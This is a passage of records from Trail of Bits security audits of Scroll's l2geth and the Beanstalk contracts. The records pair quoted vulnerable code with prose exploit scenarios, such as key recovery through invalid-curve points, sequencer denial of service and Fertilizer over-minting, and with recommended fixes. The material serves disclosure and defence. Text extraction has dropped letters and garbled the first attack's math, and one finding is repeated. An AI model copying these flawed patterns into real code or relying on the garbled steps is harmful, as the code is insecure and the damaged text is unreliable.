hold, then Alice can recover Bob's DH key using a complicated attack, based on the CRYPTO 2000 paper by Biehl et al. and the DCC 2005 paper by Ciet et al . What follows is a rough sketch of the attack. For more details, see the reference publications, which also detail the specic characteristics for Assumption 3. Exploit Scenario Alice roughly follows the following steps: 1. Find a point  ' which is not on the curve used for ECDH, and a. b. when used in Bobs scalar multiplication, is eectively on a dierent curve  ' 2. 3. 4. with (a subgroup of) small prime order Brute-force all possible values of addresses with shared secret    ' for  (    ' || 0 ) the unique stealth address associated with     ' = (    ' )   ' .   ' . 0   <  ' , i.e.,    ' =   , and sends funds to all +  (    '|| 0 ) *  =   .     ' . This happens because Monitor all resulting addresses associated with until Bob withdraws funds from Repeat steps 13 for new points '   with dierent small prime orders '   to recover  '   .   5. Use the Chinese Remainder Theorem to recover   from   '   .  As a result, Alice can now track all stealth payments made to Bob (but cannot steal funds). To understand the complexity of this attack, it is sucient for Alice to repeat steps 13 for the rst 44 primes (numbers between 2 and 193). This requires Alice to make 3,831 payments in total (corresponding to the sum of the rst 44 primes). There is a tradeo where Alice uses fewer primes, which means that fewer transactions are needed. However, it means that Alice does not recover the full b dh . To compensate for this, Alice can brute-force the discrete logarithm of B dh guided by the partial information on b dh . Because the attack compromises anonymity for a particular user without giving access to funds, we consider this issue to have medium severity. As this is a complicated attack with various assumptions that requires Bob to access the funds from all his stealth addresses, we consider this issue to have high diculty. Recommendations The specication should enforce that public keys are validated for correctness, both when they are added to the public database and when they are used by senders and receivers. These validations should include point-on-curve checks, small-order-subgroup checks (if applicable), and point-at-innity checks. References   Dierential Fault Attacks on Elliptic Curve Cryptosystems, Biehl et al., 2000 Elliptic Curve Cryptosystems in the Presence of Permanent and Transient Faults, Ciet et al.,", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "2. Multiple instances of unchecked errors ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scrollL2geth-initial-securityreview.pdf", "body": "There are multiple instances of unchecked errors in the l2geth codebase, which could lead to undened behavior when errors are raised. One such unhandled error is shown in gure 2.1. A comprehensive list of unchecked errors is provided in appendix C. if len(requests) == 0 && req.deps == 0 { s.commit(req) } else { Figure 2.1: The Sync.commit() function returns an error that is unhandled, which could lead to invalid commitments or a frozen chain. (go-ethereum/trie/sync.go#296298) Unchecked errors also make the system vulnerable to denial-of-service attacks; they could allow attackers to trigger nil dereference panics in the sequencer node. Exploit Scenario An attacker identies a way to cause a zkTrie commitment to fail, allowing invalid data to be silently committed by the sequencer. Recommendations Short term, add error checks to all functions that can emit Go errors. Long term, add the tools errcheck and ineffassign to l2geths build pipeline. These tools can be used to detect errors and prevent builds containing unchecked errors from being deployed.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "3. Risk of double-spend attacks due to use of single-node Clique consensus without nality API ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scrollL2geth-initial-securityreview.pdf", "body": "l2geth uses the proof-of-authority Clique consensus protocol, dened by EIP-255. This consensus type is not designed for single-node networks, and an attacker-controlled sequencer node may produce multiple conicting forks of the chain to facilitate double-spend attacks. The severity of this nding is compounded by the fact that there is no API for an end user to determine whether their transaction has been nalized by L1, forcing L2 users to use ineective block/time delays to determine nality. Clique consensus was originally designed as a replacement for proof-of-work consensus for Ethereum testnets. It uses the same fork choice rule as Ethereums proof-of-work consensus; the fork with the highest diculty should be considered the canonical fork. Clique consensus does not use proof-of-work and cannot update block diculty using the traditional calculation; instead, block diculty may be one of two values:  1 if the block was mined by the designated signer for the block height  2 if the block was mined by a non-designated signer for the block height This means that in a network with only one authorized signer, all of the blocks and forks produced by the sequencer will have the same diculty value, making it impossible for syncing nodes to determine which fork is canonical at the given block height. In a normal proof-of-work network, one of the proposed blocks will have a higher diculty value, causing syncing nodes to re-organize and drop the block with the lower diculty value. In a single-validator proof-of-authority network, neither block will be preferred, so each syncing node will simply prefer the rst block they received. This nding is not unique to l2geth; it will be endemic to all L2 systems that have only one authorized sequencer. Exploit Scenario An attacker acquires control over l2geths centralized sequencer node. The attacker modies the node to prove two forks: one fork containing a deposit transaction to a centralized exchange, and one fork with no such deposit transaction. The attacker publishes the rst fork, and the centralized exchange picks up and processes the deposit transaction. The attacker continues to produce blocks on the second private fork. Once the exchange processes the deposit, the attacker stops generating blocks on the public fork, generates an extra block to make the private fork longer than the public fork, then publishes the private fork to cause a re-organization across syncing nodes. This attack must be completed before the sequencer is required to publish a proof to L1. Recommendations Short term, add API methods and documentation to ensure that bridges and centralized exchanges query only for transactions that have been proved and nalized on the L1 network. Long term, decentralize the sequencer in such a way that a majority of sequencers must collude in order to successfully execute a double-spend attack. This design should be accompanied by a slashing mechanism to penalize sequencers that sign conicting blocks.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "4. Improper use of panic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scrollL2geth-initial-securityreview.pdf", "body": "l2geth overuses Gos panic mechanism in lieu of Gos built-in error propagation system, introducing opportunities for denial of service. Go has two primary methods through which errors can be reported or propagated up the call stack: the panic method and Go errors. The use of panic is not recommended, as it is unrecoverable: when an operation panics, the Go program is terminated and must be restarted. The use of panic creates a denial-of-service vector that is especially applicable to a centralized sequencer, as a restart of the sequencer would eectively halt the L2 network until the sequencer recovers. Some example uses of panic are presented in gures 4.1 to 4.3. These do not represent an exhaustive list of panic statements in the codebase, and the Scroll team should investigate each use of panic in its modied code to verify whether it truly represents an unrecoverable error. func sanityCheckByte32Key(b []byte) { if len(b) != 32 && len(b) != 20 { panic(fmt.Errorf(\"do not support length except for 120bit and 256bit now. data: %v len: %v\", b, len(b))) } } Figure 4.1: The sanityCheckByte32Key function panics when a trie key does not match the expected size. This function may be called during the execution of certain RPC requests. (go-ethereum/trie/zk_trie.go#4448) func (s *StateAccount) MarshalFields() ([]zkt.Byte32, uint32) { fields := make([]zkt.Byte32, 5) if s.Balance == nil { panic(\"StateAccount balance nil\") } if !utils.CheckBigIntInField(s.Balance) { panic(\"StateAccount balance overflow\") } if !utils.CheckBigIntInField(s.Root.Big()) { panic(\"StateAccount root overflow\") } if !utils.CheckBigIntInField(new(big.Int).SetBytes(s.PoseidonCodeHash)) { panic(\"StateAccount poseidonCodeHash overflow\") } Figure 4.2: The MarshalFields function panics when attempting to marshal an object that does not match certain requirements. This function may be called during the execution of certain RPC requests. (go-ethereum/core/types/state_account_marshalling.go#4764) func (t *ProofTracer) MarkDeletion(key []byte) { if path, existed := t.emptyTermPaths[string(key)]; existed { // copy empty node terminated path for final scanning t.rawPaths[string(key)] = path } else if path, existed = t.rawPaths[string(key)]; existed { // sanity check leafNode := path[len(path)-1] if leafNode.Type != zktrie.NodeTypeLeaf { panic(\"all path recorded in proofTrace should be ended with leafNode\") } Figure 4.3: The MarkDeletion function panics when the proof tracer contains a path that does not terminate in a leaf node. This function may be called when a syncing node attempts to process an invalid, malicious proof that an attacker has gossiped on the network. (go-ethereum/trie/zktrie_deletionproof.go#120130) Exploit Scenario An attacker identies an error path that terminates with a panic that can be triggered by a malformed RPC request or proof payload. The attacker leverages this issue to either disrupt the sequencers operation or prevent follower/syncing nodes from operating properly. Recommendations Short term, review all uses of panic that have been introduced by Scrolls changes to go-ethereum. Ensure that these uses of panic truly represent unrecoverable errors, and if not, add error handling logic to recover from the errors. Long term, annotate all valid uses of panic with explanations for why the errors are unrecoverable and, if applicable, how to prevent the unrecoverable conditions from being triggered. l2geths code review process must also be updated to verify that this documentation exists for new uses of panic that are introduced later.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "5. Risk of panic from nil dereference due to awed error reporting in addressToKey ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scrollL2geth-initial-securityreview.pdf", "body": "The addressToKey function, shown in gure 5.1, returns a nil pointer instead of a Go error when an error is returned by the preImage.Hash() function, which will cause a nil dereference panic in the NewZkTrieProofWriter function, as shown in gure 5.2. If the error generated by preImage.Hash() is unrecoverable, the addressToKey function should panic instead of silently returning a nil pointer. func addressToKey(addr common.Address) *zkt.Hash { var preImage zkt.Byte32 copy(preImage[:], addr.Bytes()) h, err := preImage.Hash() if err != nil { log.Error(\"hash failure\", \"preImage\", hexutil.Encode(preImage[:])) return nil } return zkt.NewHashFromBigInt(h) } Figure 5.1: The addressToKey function returns a nil pointer to zkt.Hash when an error is returned by preImage.Hash(). (go-ethereum/trie/zkproof/writer.go#3141) func NewZkTrieProofWriter(storage *types.StorageTrace) (*zktrieProofWriter, error) { underlayerDb := memorydb.New() zkDb := trie.NewZktrieDatabase(underlayerDb) accounts := make(map[common.Address]*types.StateAccount) // resuming proof bytes to underlayerDb for addrs, proof := range storage.Proofs { if n := resumeProofs(proof, underlayerDb); n != nil { addr := common.HexToAddress(addrs) if n.Type == zktrie.NodeTypeEmpty { accounts[addr] = nil } else if acc, err := types.UnmarshalStateAccount(n.Data()); err == nil { if bytes.Equal(n.NodeKey[:], addressToKey(addr)[:]) { accounts[addr] = acc Figure 5.2: The addressToKey function is consumed by NewZkTrieProofWriter, which will attempt to dereference the nil pointer and generate a system panic. (go-ethereum/trie/zkproof/writer.go#152167) Recommendations Short term, modify addressToKey so that it either returns an error that its calling functions can propagate or, if the error is unrecoverable, panics instead of returning a nil pointer. Long term, update Scrolls code review and style guidelines to reect that errors must be propagated by Gos error system or must halt the program by using panic.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "6. Risk of transaction pool admission denial of service ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scrollL2geth-initial-securityreview.pdf", "body": "l2geths changes to the transaction pool include an ECDSA recovery operation at the beginning of the pools transaction validation logic, introducing a denial-of-service vector: an attacker could generate invalid transactions to exhaust the sequencers resources. l2geth adds an L1 fee that all L2 transactions must pay. To verify that an L2 transaction can aord the L1 fee, the transaction pool calls fees.VerifyFee(), as shown in gure 6.1. VerifyFee() performs an ECDSA recovery operation to determine the account that will pay the L1 fee, as shown in gure 6.2. ECDSA key recovery is an expensive operation that should be executed as late in the transaction validation process as possible in order to reduce the impact of denial-of-service attacks. func (pool *TxPool) add(tx *types.Transaction, local bool) (replaced bool, err error) { // If the transaction is already known, discard it hash := tx.Hash() if pool.all.Get(hash) != nil { log.Trace(\"Discarding already known transaction\", \"hash\", hash) knownTxMeter.Mark(1) return false, ErrAlreadyKnown } // Make the local flag. If it's from local source or it's from the network but // the sender is marked as local previously, treat it as the local transaction. isLocal := local || pool.locals.containsTx(tx) if pool.chainconfig.Scroll.FeeVaultEnabled() { if err := fees.VerifyFee(pool.signer, tx, pool.currentState); err != nil { Figure 6.1: TxPool.add() calls fees.VerifyFee() before any other transaction validators are called. (go-ethereum/core/tx_pool.go#684697) func VerifyFee(signer types.Signer, tx *types.Transaction, state StateDB) error { from, err := types.Sender(signer, tx) if err != nil { return errors.New(\"invalid transaction: invalid sender\") } Figure 6.2: VerifyFee() initiates an ECDSA recovery operation via types.Sender(). (go-ethereum/rollup/fees/rollup_fee.go#198202) Exploit Scenario An attacker generates a denial-of-service attack against the sequencer by submitting extraordinarily large transactions. Because ECDSA recovery is a CPU-intensive operation and is executed before the transaction size is checked, the attacker is able to exhaust the memory resources of the sequencer. Recommendations Short term, modify the code to check for L1 fees in the TxPool.validateTx() function immediately after that function calls types.Sender(). This will ensure that other, less expensive-to-check validations are performed before the ECDSA signature is recovered. Long term, exercise caution when making changes to code paths that validate information received from public sources or gossip. For changes to the transaction pool, a good general rule of thumb is to validate transaction criteria in the following order: 1. Simple, in-memory criteria that do not require disk reads or data manipulation 2. Criteria that require simple, in-memory manipulations of the data such as checks of the transaction size 3. Criteria that require an in-memory state trie to be checked 4. ECDSA recovery operations 5. Criteria that require an on-disk state trie to be checked However, note that sometimes these criteria must be checked out of order; for example, the ECDSA recovery operation to identify the origin account may need to be performed before the state trie is checked to determine whether the account can aord the transaction.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "1. Transaction pool fails to drop transactions that cannot a\u0000ord L1 fees ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scrollL2geth-initial-securityreview.pdf", "body": "l2geth denes two fees that must be paid for L2 transactions: an L2 fee and an L1 fee. However, the code fails to account for L1 fees; as a result, transactions that cannot aord the combined L1 and L2 fees may be included in a block rather than demoted, as intended. The transaction.go le denes a Cost() function that returns the amount of ether that a transaction consumes, as shown in gure 1.1. The current implementation of Cost() does not account for L1 fees, causing other parts of the codebase to misjudge the balance requirements to execute a transaction. The correct implementation of Cost() should match the implementation of VerifyFee(), which correctly checks for L1 fees. // Cost returns gas * gasPrice + value. func (tx *Transaction) Cost() *big.Int { total := new(big.Int).Mul(tx.GasPrice(), new(big.Int).SetUint64(tx.Gas())) total.Add(total, tx.Value()) return total } Figure 1.1: The Cost() function does not include L1 fees in its calculation. (go-ethereum/core/types/transaction.go#318323) Most notably, Cost() is consumed by the tx_list.Filter() function, which is used to prune un-executable transactions (transactions that cannot aord the fees), as shown in gure 1.2. The failure to account for L1 fees in Cost() could cause tx_list.Filter() to fail to demote such transactions, causing them to be incorrectly included in the block. func (l *txList) Filter(costLimit *big.Int, gasLimit uint64) (types.Transactions, types.Transactions) { // If all transactions are below the threshold, short circuit if l.costcap.Cmp(costLimit) <= 0 && l.gascap <= gasLimit { return nil, nil } l.costcap = new(big.Int).Set(costLimit) // Lower the caps to the thresholds l.gascap = gasLimit // Filter out all the transactions above the account's funds removed := l.txs.Filter(func(tx *types.Transaction) bool { return tx.Gas() > gasLimit || tx.Cost().Cmp(costLimit) > 0 }) Figure 1.2: Filter() uses Cost() to determine which transactions to demote. (go-ethereum/core/tx_list.go#332343) Exploit Scenario A user creates an L2 transaction that can just barely aord the L1 and L2 fees in the next upcoming block. Their transaction is delayed due to full blocks and is included in a future block in which the L1 fees have risen. Their transaction reverts due to the increased L1 fees instead of being ejected from the transaction pool. Recommendations Short term, refactor the Cost() function to account for L1 fees, as is done in the VerifyFee() function; alternatively, have the transaction list structure use VerifyFee() or a similar function instead of Cost(). Long term, add additional tests to verify complex state transitions such as a transaction becoming un-executable due to changes in L1 fees.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "6. Risk of transaction pool admission denial of service ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scrollL2geth-initial-securityreview.pdf", "body": "l2geths changes to the transaction pool include an ECDSA recovery operation at the beginning of the pools transaction validation logic, introducing a denial-of-service vector: an attacker could generate invalid transactions to exhaust the sequencers resources. l2geth adds an L1 fee that all L2 transactions must pay. To verify that an L2 transaction can aord the L1 fee, the transaction pool calls fees.VerifyFee(), as shown in gure 6.1. VerifyFee() performs an ECDSA recovery operation to determine the account that will pay the L1 fee, as shown in gure 6.2. ECDSA key recovery is an expensive operation that should be executed as late in the transaction validation process as possible in order to reduce the impact of denial-of-service attacks. func (pool *TxPool) add(tx *types.Transaction, local bool) (replaced bool, err error) { // If the transaction is already known, discard it hash := tx.Hash() if pool.all.Get(hash) != nil { log.Trace(\"Discarding already known transaction\", \"hash\", hash) knownTxMeter.Mark(1) return false, ErrAlreadyKnown } // Make the local flag. If it's from local source or it's from the network but // the sender is marked as local previously, treat it as the local transaction. isLocal := local || pool.locals.containsTx(tx) if pool.chainconfig.Scroll.FeeVaultEnabled() { if err := fees.VerifyFee(pool.signer, tx, pool.currentState); err != nil { Figure 6.1: TxPool.add() calls fees.VerifyFee() before any other transaction validators are called. (go-ethereum/core/tx_pool.go#684697) func VerifyFee(signer types.Signer, tx *types.Transaction, state StateDB) error { from, err := types.Sender(signer, tx) if err != nil { return errors.New(\"invalid transaction: invalid sender\") } Figure 6.2: VerifyFee() initiates an ECDSA recovery operation via types.Sender(). (go-ethereum/rollup/fees/rollup_fee.go#198202) Exploit Scenario An attacker generates a denial-of-service attack against the sequencer by submitting extraordinarily large transactions. Because ECDSA recovery is a CPU-intensive operation and is executed before the transaction size is checked, the attacker is able to exhaust the memory resources of the sequencer. Recommendations Short term, modify the code to check for L1 fees in the TxPool.validateTx() function immediately after that function calls types.Sender(). This will ensure that other, less expensive-to-check validations are performed before the ECDSA signature is recovered. Long term, exercise caution when making changes to code paths that validate information received from public sources or gossip. For changes to the transaction pool, a good general rule of thumb is to validate transaction criteria in the following order:", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "7. Syncing nodes fail to check consensus rule for L1 message count ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scrollL2geth-initial-securityreview.pdf", "body": "l2geth adds a consensus rule requiring that there be no more than L1Config.NumL1MessagesPerBlock number of L1 messages per L2 block. This rule is checked by the sequencer when building new blocks but is not checked by syncing nodes through the ValidateL1Messages function, as shown in gure 7.1. // TODO: consider adding a rule to enforce L1Config.NumL1MessagesPerBlock. // If there are L1 messages available, sequencer nodes should include them. // However, this is hard to enforce as different nodes might have different views of L1. Figure 7.1: The ValidateL1Messages function does not check the NumL1MessagesPerBlock restriction. (go-ethereum/core/block_validator.go#145147) The TODO comment shown in the gure expresses a concern that syncing nodes cannot enforce NumL1MessagesPerBlock due to the dierent view of L1 that the nodes may have; however, this issue does not prevent syncing nodes from simply checking the number of L1 messages included in the block. Exploit Scenario A malicious sequencer ignores the NumL1MessagesPerBlock restriction while constructing a block, thus bypassing the consensus rules. Follower nodes consider the block to be valid even though the consensus rule is violated. Recommendations Short term, add a check to ValidateL1Messages to check the maximum number of L1 messages per block restriction. Long term, document and check all changes to the systems consensus rules to ensure that both nodes that construct blocks and nodes that sync blocks check the consensus rules. This includes having syncing nodes check whether an L1 transaction actually exists on the L1, a concern expressed in comments further up in the ValidateL1Messages function. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "1. Attackers could mint more Fertilizer than intended due to an unused variable ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf", "body": "Due to an unused local variable, an attacker could mint more Fertilizer than should be allowed by the sale. The mintFertilizer() function checks that the _amount variable is no greater than the remaining variable; this ensures that more Fertilizer than intended cannot be minted; however, the _amount variable is not used in subsequent function callsinstead, the amount variable is used; the code eectively skips this check, allowing users to mint more Fertilizer than required to recapitalize the protocol. function mintFertilizer ( uint128 amount , uint256 minLP , LibTransfer.From mode ) external payable { uint256 remaining = LibFertilizer.remainingRecapitalization(); uint256 _amount = uint256 (amount); if (_amount > remaining) _amount = remaining; LibTransfer.receiveToken( C.usdc(), uint256 ( amount ).mul(1e6), msg.sender , mode ); uint128 id = LibFertilizer.addFertilizer( uint128 (s.season.current), amount , minLP ); C.fertilizer().beanstalkMint( msg.sender , uint256 (id), amount , s.bpf); } Figure 1.1: The mintFertilizer() function in FertilizerFacet.sol#L35- Note that this aw can be exploited only once: if users mint more Fertilizer than intended, the remainingRecapitalization() function returns 0 because the dollarPerUnripeLP() and unripeLP() . totalSupply() variables are constants. function remainingRecapitalization() internal view returns (uint256 remaining) { } AppStorage storage s = LibAppStorage.diamondStorage(); uint256 totalDollars = C .dollarPerUnripeLP() .mul(C.unripeLP().totalSupply()) .div(DECIMALS); if (s.recapitalized >= totalDollars) return 0; return totalDollars.sub(s.recapitalized); Figure 1.2: The remainingRecapitalization() function in LibFertilizer.sol#L132-145 Exploit Scenario Recapitalization of the Beanstalk protocol is almost complete; only 100 units of Fertilizer for sale remain. Eve, a malicious user, calls mintFertilizer() with an amount of 10 million, signicantly over-funding the system. Because the Fertilizer supply increased signicantly above the theoretical maximum, other users are entitled to a much smaller yield than expected. Recommendations Short term, use _amount instead of amount as the parameter in the functions that are called after mintFertilizer() . Long term, thoroughly document the expected behavior of the FertilizerFacet contract and the properties (invariants) it should enforce, such as token amounts above the maximum recapitalization threshold cannot be sold. Expand the unit test suite to test that these properties hold.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "2. Lack of a two-step process for ownership transfer ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf", "body": "The transferOwnership() function is used to change the owner of the Beanstalk protocol. This function calls the setContractOwner() function, which immediately sets the contracts new owner. Transferring ownership in one function call is error-prone and could result in irrevocable mistakes. function transferOwnership ( address _newOwner ) external override { LibDiamond.enforceIsContractOwner(); LibDiamond.setContractOwner(_newOwner); } Figure 2.1: The transferOwnership() function in OwnershipFacet.sol#L13-16 Exploit Scenario The owner of the Beanstalk contracts is a community controlled multisignature wallet. The community agrees to upgrade to an on-chain voting system, but the wrong address is mistakenly provided to its call to transferOwnership() , permanently misconguring the system. Recommendations Short term, implement a two-step process to transfer contract ownership, in which the owner proposes a new address and then the new address executes a call to accept the role, completing the transfer. Long term, identify and document all possible actions that can be taken by privileged accounts and their associated risks. This will facilitate reviews of the codebase and prevent future mistakes.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "3. Possible underow could allow more Fertilizer than MAX_RAISE to be minted ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf", "body": "The remaining() function could underow, which could allow the Barn Raise to continue indenitely. Fertilizer is an ERC1155 token issued for participation in the Barn Raise, a community fundraiser intended to recapitalize the Beanstalk protocol with Bean and liquidity provider (LP) tokens that were stolen during the April 2022 governance hack. Fertilizer entitles holders to a pro rata portion of one-third of minted Bean tokens if the Fertilizer token is active, and it can be minted as long as the recapitalization target ($77 million) has not been reached. Users who want to buy Fertilizer call the mint() function and provide one USDC for each Fertilizer token they want to mint. function mint(uint256 amount) external payable nonReentrant { uint256 r = remaining(); if (amount > r) amount = r; __mint(amount); IUSDC.transferFrom(msg.sender, CUSTODIAN, amount); } Figure 3.1: The mint() function in FertilizerPremint.sol#L51-56 The mint() function rst checks how many Fertilizer tokens remain to be minted by calling the remaining() function (gure 3.2); if the user is trying to mint more Fertilizer than available, the mint() function mints all of the Fertilizer tokens that remain. function remaining() public view returns (uint256) { return MAX_RAISE - IUSDC.balanceOf(CUSTODIAN); } Figure 3.2: The remaining() function in FertilizerPremint.sol#L84- However, the FertilizerPremint contract does not use Solidity 0.8, so it does not have native overow and underow protection. As a result, if the amount of Fertilizer purchased reaches MAX_RAISE (i.e., 77 million), an attacker could simply send one USDC to the CUSTODIAN wallet to cause the remaining() function to underow, allowing the sale to continue indenitely. In this particular case, Beanstalk protocol funds are not at risk because all the USDC used to purchase Fertilizer tokens is sent to a Beanstalk community-owned multisignature wallet; however, users who buy Fertilizer after such an exploit would lose the gas funds they spent, and the project would incur further reputational damage. Exploit Scenario The Barn Raise is a total success: the MAX_RAISE amount is hit, meaning that 77 million Fertilizer tokens have been minted. Alice, a malicious user, notices the underow risk in the remaining() function; she sends one USDC to the CUSTODIAN wallet, triggering the underow and causing the function to return the maxuint256 instead of MAX_RAISE . As a result, the sale continues even though the MAX_RAISE amount was reached. Other users, not knowing that the Barn Raise should be complete, continue to successfully mint Fertilizer tokens until the bug is discovered and the system is paused to address the issue. While no Beanstalk funds are lost as a result of this exploit, the users who continued minting Fertilizer after the MAX_RAISE was reached lose all the gas funds they spent. Recommendations Short term, add a check in the remaining() function so that it returns 0 if USDC.balanceOf(CUSTODIAN) is greater than or equal to MAX_RAISE . This will prevent the underow from being triggered. Because the function depends on the CUSTODIAN s balance, it is still possible for someone to send USDC directly to the CUSTODIAN wallet and reduce the amount of available Fertilizer; however, attackers would lose their money in the process, meaning that there are no incentives to perform this kind of action. Long term, thoroughly document the expected behavior of the FertilizerPremint contract and the properties (invariants) it should enforce, such as no tokens can be minted once the MAX_RAISE is reached. Expand the unit test suite to test that these properties hold.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "4. Risk of Fertilizer id collision that could result in loss of funds ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf", "body": "If a user mints Fertilizer tokens twice during two dierent seasons, the same token id for both tokens could be calculated, and the rst entry will be overridden; if this occurs and the bpf value changes, the user would be entitled to less yield than expected. To mint new Fertilizer tokens, users call the mintFertilizer() function in the FertilizerFacet contract. An id is calculated for each new Fertilizer token that is minted; not only is this id an identier for the token, but it also represents the endBpf period, which is the moment at which the Fertilizer reaches maturity and can be redeemed without incurring any penalty. function mintFertilizer( uint128 amount, uint256 minLP, LibTransfer.From mode ) external payable { uint256 remaining = LibFertilizer.remainingRecapitalization(); uint256 _amount = uint256(amount); if (_amount > remaining) _amount = remaining; LibTransfer.receiveToken( C.usdc(), uint256(amount).mul(1e6), msg.sender, mode ); uint128 id = LibFertilizer.addFertilizer( uint128(s.season.current), amount, minLP ); C.fertilizer().beanstalkMint(msg.sender, uint256(id), amount, s.bpf); } Figure 4.1: The mintFertilizer() function in Fertilizer.sol#L35-55 The id is calculated by the addFertilizer() function in the LibFertilizer library as the sum of 1 and the bpf and humidity values. function addFertilizer( uint128 season, uint128 amount, uint256 minLP ) internal returns (uint128 id) { AppStorage storage s = LibAppStorage.diamondStorage(); uint256 _amount = uint256(amount); // Calculate Beans Per Fertilizer and add to total owed uint128 bpf = getBpf(season); s.unfertilizedIndex = s.unfertilizedIndex.add( _amount.mul(uint128(bpf)) ); // Get id id = s.bpf.add(bpf); [...] } function getBpf(uint128 id) internal pure returns (uint128 bpf) { bpf = getHumidity(id).add(1000).mul(PADDING); } function getHumidity(uint128 id) internal pure returns (uint128 humidity) { if (id == REPLANT_SEASON) return 5000; if (id >= END_DECREASE_SEASON) return 200; uint128 humidityDecrease = id.sub(REPLANT_SEASON + 1).mul(5); humidity = RESTART_HUMIDITY.sub(humidityDecrease); } Figure 4.2: The id calculation in LibFertilizer.sol#L32-67 However, the method that generates these token id s does not prevent collisions. The bpf value is always increasing (or does not move), and humidity decreases every season until it reaches 20%. This makes it possible for a user to mint two tokens in two dierent seasons with dierent bpf and humidity values and still get the same token id . function beanstalkMint(address account, uint256 id, uint128 amount, uint128 bpf) external onlyOwner { _balances[id][account].lastBpf = bpf; _safeMint( account, id, amount, bytes('0') ); } Figure 4.3: The beanstalkMint() function in Fertilizer.sol#L40-48 An id collision is not necessarily a problem; however, when a token is minted, the value of the lastBpf eld is set to the bpf of the current season, as shown in gure 4.3. This eld is very important because it is used to determine the penalty, if any, that a user will incur when redeeming Fertilizer. To redeem Fertilizer, users call the claimFertilizer() function, which in turn calls the beanstalkUpdate() function on the Fertilizer contract. function claimFertilized(uint256[] calldata ids, LibTransfer.To mode) external payable { } uint256 amount = C.fertilizer().beanstalkUpdate(msg.sender, ids, s.bpf); LibTransfer.sendToken(C.bean(), amount, msg.sender, mode); Figure 4.4: The claimFertilizer() function in FertilizerFacet.sol#L27-33 function beanstalkUpdate( address account, uint256[] memory ids, uint128 bpf ) external onlyOwner returns (uint256) { return __update(account, ids, uint256(bpf)); } function __update( address account, uint256[] memory ids, uint256 bpf ) internal returns (uint256 beans) { for (uint256 i = 0; i < ids.length; i++) { uint256 stopBpf = bpf < ids[i] ? bpf : ids[i]; uint256 deltaBpf = stopBpf - _balances[ids[i]][account].lastBpf; if (deltaBpf > 0) { beans = beans.add(deltaBpf.mul(_balances[ids[i]][account].amount)); _balances[ids[i]][account].lastBpf = uint128(stopBpf); } } emit ClaimFertilizer(ids, beans); } Figure 4.5: The update ow in Fertilizer.sol#L32-38 and L72-86 The beanstalkUpdate() function then calls the __update() function. This function rst calculates the stopBpf value, which is one of two possible values. If the Fertilizer is being redeemed early, stopBpf is the bpf at which the Fertilizer is being redeemed; if the token is being redeemed at maturity or later, stopBpf is the token id (i.e., the endBpf value). Afterward, __update() calculates the deltaBpf value, which is used to determine the penalty, if any, that the user will incur when redeeming the token; deltaBpf is calculated using the stopBpf value that was already dened and the lastBpf value, which is the bpf corresponding to the last time the token was redeemed or, if it was never redeemed, the bpf at the moment the token was minted. Finally, the tokens lastBpf eld is updated to the stopBpf . Because of the id collision, users could accidentally mint Fertilizer tokens with the same id in two dierent seasons and override their rst mints lastBpf eld, ultimately reducing the amount of yield they are entitled to. Exploit Scenario Imagine the following scenario:   It is currently the rst season; the bpf is 0 and the humidity is 40%. Alice mints 100 Fertilizer tokens with an id of 41 (the sum of 1 and the bpf ( 0 ) and humidity ( 40 ) values), and lastBpf is set to 0 . Some time goes by, and it is now the third season; the bpf is 35 and the humidity is 5%. Alice mints one additional Fertilizer token with an id of 41 (the sum of 1 and the bpf ( 35 ) and humidity ( 5 ) values), and lastBpf is set to 35 . Because of the second mint, the lastBpf eld of Alices Fertilizer tokens is overridden, making her lose a substantial amount of the yield she was entitled to:  Using the formula for calculating the number of BEAN tokens that users are entitled to, shown in gure 4.5, Alices original yield at maturity would have been 4,100 tokens:  deltaBpf = id - lastBpf = 41 - 0 = 41  balance = 100  beans received = deltaBpf * balance = 41 * 100 = 4100  As a result of the overridden lastBpf eld, Alices yield instead ends up being only 606 tokens:  deltaBpf = id - lastBpf = 41 - 35 = 6  balance = 101  beans received = deltaBpf * balance = 6 * 101 = 606 Recommendations Short term, separate the role of the id into two separate variables for the token index and endBpf . That way, the index can be optimized to prevent collisions, while endBpf can accurately represent the data it needs to represent. Alternatively, modify the relevant code so that when an id collision occurs, it either reverts or redeems the previous Fertilizer rst before minting the new tokens. However, these alternate remedies could introduce new edge cases or could result in a degraded user experience; if either alternate remedy is implemented, it would need to be thoroughly documented to inform the users of its particular behavior. Long term, thoroughly document the expected behavior of the associated code and include regression tests to prevent similar issues from being introduced in the future. Additionally, exercise caution when using one variable to serve two purposes. Gas savings should be measured and weighed against the increased complexity. Developers should be aware that performing optimizations could introduce new edge cases and increase the codes complexity.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: 